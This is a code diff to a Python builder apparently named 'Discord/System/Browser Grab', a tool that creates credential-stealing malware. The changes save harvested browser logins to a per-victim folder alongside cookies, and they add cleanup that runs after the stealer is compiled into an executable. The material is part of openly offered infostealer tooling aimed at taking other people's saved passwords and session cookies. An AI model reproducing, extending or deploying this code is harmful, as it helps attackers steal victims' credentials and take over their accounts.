@@ -3,7 +3,6 @@ from Config.Config import *
 import random
 import os
 import subprocess
-import time
 from tkinter import Tk, filedialog
 
 Title("Discord/System/Browser Grab")
@@ -1058,7 +1057,7 @@ class Upload:
     def write_files(self):
         os.makedirs(f"Browsers_{username_pc}", exist_ok=True)
         if __LOGINS__:
-            with open("\\logins.txt", "w", encoding="utf-8") as f:
+            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_logins.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __LOGINS__))
 
         if __COOKIES__:
@@ -1451,5 +1450,23 @@ if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
 else: 
  convert_to_exe(file_python, path_destination)
 
+print(f"{color.RED}[!] | Removing temporary files from conversion..{color.RESET}")
+try:
+    directory = os.getcwd()
+    shutil.rmtree(f"{directory}/build")
+    os.remove(f"{name_file}.spec")
+    os.remove(file_text)
+    os.remove(file_python)
+    print(f"{color.RED}[!] | Temporary file removed.{color.RESET}")
+except:
+   print(f"{color.RED}[!] | Temporary file not removed.{color.RESET}")
+
+try:
+    print(f"{color.RED}[!] | Open \"{color.WHITE}{path_destination}{color.RED}\"")
+    path = directory + "/1-File-Create"
+    path = os.path.realpath(path)
+    os.startfile(path)
+except:
+   ()
 Continue()
 Reset()
